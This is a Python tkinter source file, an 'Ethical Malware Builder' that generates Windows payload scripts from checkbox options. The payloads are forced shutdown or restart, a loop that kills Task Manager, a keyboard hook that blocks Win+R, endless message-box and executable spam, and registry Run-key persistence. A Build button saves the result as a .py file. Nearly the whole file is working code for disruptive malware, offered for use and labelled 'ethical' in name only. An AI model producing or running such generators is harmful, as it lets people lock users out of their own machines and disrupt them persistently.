import tkinter as tk
from tkinter import ttk, messagebox, filedialog

class MalwareBuilder(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Ethical Malware Builder")
        self.geometry("600x700")

        # Readonly Textbox to show generated code snippets
        self.code_text = tk.Text(self, height=14, width=70)
        self.code_text.config(state='disabled')
        self.code_text.pack(pady=10)

        # First line of checkboxes frame
        checkbox_frame = tk.Frame(self)
        checkbox_frame.pack(anchor='w', padx=10)

        # Shutdown checkbox + config frame
        shutdown_frame = tk.Frame(checkbox_frame)
        shutdown_frame.pack(side='left', padx=20, anchor='n')

        self.shutdown_var = tk.IntVar()
        self.shutdown_check = tk.Checkbutton(shutdown_frame, text="Shutdown", variable=self.shutdown_var, command=self.update_code)
        self.shutdown_check.pack(anchor='w')

        # Delay config under Shutdown checkbox
        delay_frame = tk.Frame(shutdown_frame)
        delay_frame.pack(anchor='w', pady=(5, 0))
        tk.Label(delay_frame, text="Delay (sec):").pack(side='left')
        self.delay_var = tk.IntVar(value=5)
        self.delay_spin = tk.Spinbox(delay_frame, from_=0, to=60, textvariable=self.delay_var, width=5, command=self.update_code, state='readonly')
        self.delay_spin.pack(side='left')

        # MsgBox checkbox + config frame
        msgbox_frame = tk.Frame(checkbox_frame)
        msgbox_frame.pack(side='left', padx=20, anchor='n')

        self.msgbox_var = tk.IntVar()
        self.msgbox_check = tk.Checkbutton(msgbox_frame, text="MsgBox", variable=self.msgbox_var, command=self.update_code)
        self.msgbox_check.pack(anchor='w')

        # MsgBox configs under MsgBox checkbox
        msgbox_config_frame = tk.Frame(msgbox_frame)
        msgbox_config_frame.pack(anchor='w', pady=(5, 0))

        tk.Label(msgbox_config_frame, text="Title:").grid(row=0, column=0, sticky='e')
        self.msgbox_title_var = tk.StringVar(value="Test Title")
        self.msgbox_title_entry = tk.Entry(msgbox_config_frame, textvariable=self.msgbox_title_var, width=30)
        self.msgbox_title_entry.grid(row=0, column=1, padx=5, pady=2)
        self.msgbox_title_entry.bind("<KeyRelease>", lambda e: self.update_code())

        tk.Label(msgbox_config_frame, text="Message:").grid(row=1, column=0, sticky='e')
        self.msgbox_text_var = tk.StringVar(value="Test Message")
        self.msgbox_text_entry = tk.Entry(msgbox_config_frame, textvariable=self.msgbox_text_var, width=30)
        self.msgbox_text_entry.grid(row=1, column=1, padx=5, pady=2)
        self.msgbox_text_entry.bind("<KeyRelease>", lambda e: self.update_code())

        # New "Answer" dropdown for MsgBox
        tk.Label(msgbox_config_frame, text="Answer:").grid(row=2, column=0, sticky='e')
        self.answer_var = tk.StringVar(value="Run Code")
        self.answer_combo = ttk.Combobox(msgbox_config_frame, textvariable=self.answer_var, width=27, state='readonly')
        self.answer_combo['values'] = ("Shutdown", "Restart", "Run Code")
        self.answer_combo.grid(row=2, column=1, padx=5, pady=2)
        self.answer_combo.bind("<<ComboboxSelected>>", lambda e: self.update_code())

        # Block Taskmgr checkbox (no config)
        block_frame = tk.Frame(checkbox_frame)
        block_frame.pack(side='left', padx=20, anchor='n')

        self.block_taskmgr_var = tk.IntVar()
        self.block_taskmgr_check = tk.Checkbutton(block_frame, text="Block Taskmgr", variable=self.block_taskmgr_var, command=self.update_code)
        self.block_taskmgr_check.pack(anchor='w')

        # Second line of options
        second_line_frame = tk.Frame(self)
        second_line_frame.pack(anchor='w', padx=10, pady=15)

        # Spam MsgBox checkbox + config
        spam_frame = tk.Frame(second_line_frame)
        spam_frame.pack(side='left', padx=20, anchor='n')

        self.spam_var = tk.IntVar()
        self.spam_check = tk.Checkbutton(spam_frame, text="Spam MsgBox", variable=self.spam_var, command=self.update_code)
        self.spam_check.pack(anchor='w')

        # Spam Exe checkbox + config frame
        spamexe_frame = tk.Frame(second_line_frame)
        spamexe_frame.pack(side='left', padx=20, anchor='n')

        self.spamexe_var = tk.IntVar()
        self.spamexe_check = tk.Checkbutton(spamexe_frame, text="Spam Exe", variable=self.spamexe_var, command=self.update_code)
        self.spamexe_check.pack(anchor='w')

        tk.Label(spamexe_frame, text="Exe Name:").pack(anchor='w')
        self.spamexe_name_var = tk.StringVar(value="msedge.exe")
        self.spamexe_name_entry = tk.Entry(spamexe_frame, textvariable=self.spamexe_name_var, width=20)
        self.spamexe_name_entry.pack(anchor='w')
        self.spamexe_name_entry.bind("<KeyRelease>", lambda e: self.update_code())

        tk.Label(spamexe_frame, text="Delay (sec):").pack(anchor='w', pady=(10, 0))
        self.spamexe_delay_var = tk.DoubleVar(value=0.1)
        self.spamexe_delay_spin = tk.Spinbox(spamexe_frame, from_=0.01, to=10.0, increment=0.01,
                                             textvariable=self.spamexe_delay_var, width=7, command=self.update_code)
        self.spamexe_delay_spin.pack(anchor='w')

        # Block Win+R checkbox (moved here)
        block_winr_frame = tk.Frame(second_line_frame)
        block_winr_frame.pack(side='left', padx=20, anchor='n')

        self.block_winr_var = tk.IntVar()
        self.block_winr_check = tk.Checkbutton(block_winr_frame, text="Block Win+R", variable=self.block_winr_var, command=self.update_code)
        self.block_winr_check.pack(anchor='w')

        # Startup checkbox + config
        startup_frame = tk.Frame(second_line_frame)
        startup_frame.pack(side='left', padx=20, anchor='n')

        self.startup_var = tk.IntVar()
        self.startup_check = tk.Checkbutton(startup_frame, text="Startup", variable=self.startup_var, command=self.update_code)
        self.startup_check.pack(anchor='w')

        tk.Label(startup_frame, text="Registry Name:").pack(anchor='w', pady=(5, 0))
        self.startup_name_var = tk.StringVar(value="MyMalware")
        self.startup_name_entry = tk.Entry(startup_frame, textvariable=self.startup_name_var, width=20)
        self.startup_name_entry.pack(anchor='w')
        self.startup_name_entry.bind("<KeyRelease>", lambda e: self.update_code())

        # Bottom frame for the Build button (bottom-left)
        bottom_frame = tk.Frame(self)
        bottom_frame.pack(fill='x', side='bottom', padx=10, pady=10)
        self.build_button = tk.Button(bottom_frame, text="Build", command=self.build_script)
        self.build_button.pack(side='left')

        # Keep track of selected payloads code snippets
        self.payloads_code = {}

    def update_code(self):
        self.payloads_code.clear()

        shutdown_delay = self.delay_var.get()
        shutdown_code = f"""
import os
import time

time.sleep({shutdown_delay})
os.system('shutdown /s /t 1')  # Windows shutdown command
"""

        restart_code = f"""
import os
import time

time.sleep({shutdown_delay})
os.system('shutdown /r /t 1')  # Windows restart command
"""

        # Block Taskmgr code snippet
        block_taskmgr_code = '''
import psutil
import time

def block_taskmgr():
    while True:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                try:
                    proc.kill()
                except:
                    pass
        time.sleep(1)

block_taskmgr()
'''

        # Block Win+R code snippet
        block_winr_code = '''
import ctypes
import time
import threading

user32 = ctypes.WinDLL('user32', use_last_error=True)

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
VK_LWIN = 0x5B
VK_R = 0x52

blocked = False

def low_level_keyboard_proc(nCode, wParam, lParam):
    from ctypes import POINTER, cast, c_void_p, c_ulong, Structure, c_int, c_uint
    class KBDLLHOOKSTRUCT(Structure):
        _fields_ = [('vkCode', c_uint),
                    ('scanCode', c_uint),
                    ('flags', c_uint),
                    ('time', c_uint),
                    ('dwExtraInfo', c_ulong)]

    if nCode == 0 and wParam == WM_KEYDOWN:
        kb = cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents
        # If Left Win pressed + R pressed => block
        if kb.vkCode == VK_R and blocked:
            return 1  # Block 'R' if Win is pressed
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def block_win_r():
    global blocked

    from ctypes import WINFUNCTYPE, c_int, POINTER
    from ctypes.wintypes import DWORD, WPARAM, LPARAM, HHOOK, MSG

    LowLevelKeyboardProc = WINFUNCTYPE(c_int, c_int, WPARAM, LPARAM)

    def hook_proc(nCode, wParam, lParam):
        from ctypes import cast, POINTER, c_void_p, c_uint
        class KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [('vkCode', c_uint),
                        ('scanCode', c_uint),
                        ('flags', c_uint),
                        ('time', c_uint),
                        ('dwExtraInfo', ctypes.c_ulong)]
        if nCode == 0 and wParam == WM_KEYDOWN:
            kb = cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents
            if kb.vkCode == VK_R and blocked:
                return 1  # block the keypress
            # Also block Win key itself here if needed
        return user32.CallNextHookEx(None, nCode, wParam, lParam)

    blocked = True

    hHook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc(hook_proc), None, 0)

    msg = MSG()
    while True:
        user32.GetMessageW(ctypes.byref(msg), None, 0, 0)

threading.Thread(target=block_win_r, daemon=True).start()
'''

        # Spam MsgBox code snippet
        spam_code = f'''
import tkinter as tk
from tkinter import messagebox
import threading
import time

def spam_msgbox():
    def show_box():
        while True:
            root = tk.Tk()
            root.withdraw()
            messagebox.showinfo("{self.msgbox_title_var.get().replace('"', '\\"')}", "{self.msgbox_text_var.get().replace('"', '\\"')}")
            root.destroy()
            time.sleep(0.1)
    threading.Thread(target=show_box, daemon=True).start()

spam_msgbox()
'''

        # Spam Exe code snippet
        spamexe_name = self.spamexe_name_var.get().strip()
        spamexe_delay = self.spamexe_delay_var.get()
        spamexe_code = f'''
import os
import time
import threading

def spam_exe():
    while True:
        os.startfile(r"{spamexe_name}")
        time.sleep({spamexe_delay})

threading.Thread(target=spam_exe, daemon=True).start()
'''

        # Startup registry code snippet
        startup_name = self.startup_name_var.get().strip()
        startup_code = f'''
import os
import sys
import winreg

def add_to_startup():
    try:
        path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "{startup_name}", 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except Exception as e:
        pass

add_to_startup()
'''

        # Compose main payload (excluding MsgBox and Block Taskmgr)
        main_payload_code = ""
        if self.shutdown_var.get():
            main_payload_code += shutdown_code + "\n"

        # Compose MsgBox code block with Answer handling
        if self.msgbox_var.get():
            title = self.msgbox_title_var.get().replace('"', '\\"')
            message = self.msgbox_text_var.get().replace('"', '\\"')
            answer = self.answer_var.get()

            msgbox_code = f'''
import tkinter as tk
from tkinter import messagebox

root = tk.Tk()
root.withdraw()
messagebox.showinfo("{title}", "{message}")
root.destroy()
'''

            if answer == "Shutdown":
                msgbox_code += shutdown_code
                self.payloads_code['msgbox'] = msgbox_code
            elif answer == "Restart":
                msgbox_code += restart_code
                self.payloads_code['msgbox'] = msgbox_code
            elif answer == "Run Code":
                msgbox_code += main_payload_code
                self.payloads_code['msgbox'] = msgbox_code
                main_payload_code = ""
        else:
            if main_payload_code:
                self.payloads_code['main'] = main_payload_code

        # Add block taskmgr if checked
        if self.block_taskmgr_var.get():
            self.payloads_code['block_taskmgr'] = block_taskmgr_code

        # Add block win+r if checked
        if self.block_winr_var.get():
            self.payloads_code['block_winr'] = block_winr_code

        # Add spam msgbox if checked
        if self.spam_var.get():
            self.payloads_code['spam_msgbox'] = spam_code

        # Add spam exe if checked
        if self.spamexe_var.get():
            self.payloads_code['spam_exe'] = spamexe_code

        # Add startup if checked
        if self.startup_var.get():
            self.payloads_code['startup'] = startup_code

        # Combine all code snippets
        combined_code = "\n".join(self.payloads_code.values())

        self.code_text.config(state='normal')
        self.code_text.delete(1.0, tk.END)
        self.code_text.insert(tk.END, combined_code.strip())
        self.code_text.config(state='disabled')

    def build_script(self):
        # Save the generated code to a file
        code = self.code_text.get(1.0, tk.END).strip()
        if not code:
            messagebox.showwarning("Warning", "No payload selected!")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".py",
                                                 filetypes=[("Python Files", "*.py")])
        if file_path:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(code)
            messagebox.showinfo("Saved", f"Payload saved to {file_path}")

if __name__ == "__main__":
    app = MalwareBuilder()
    app.update_code()
    app.mainloop()
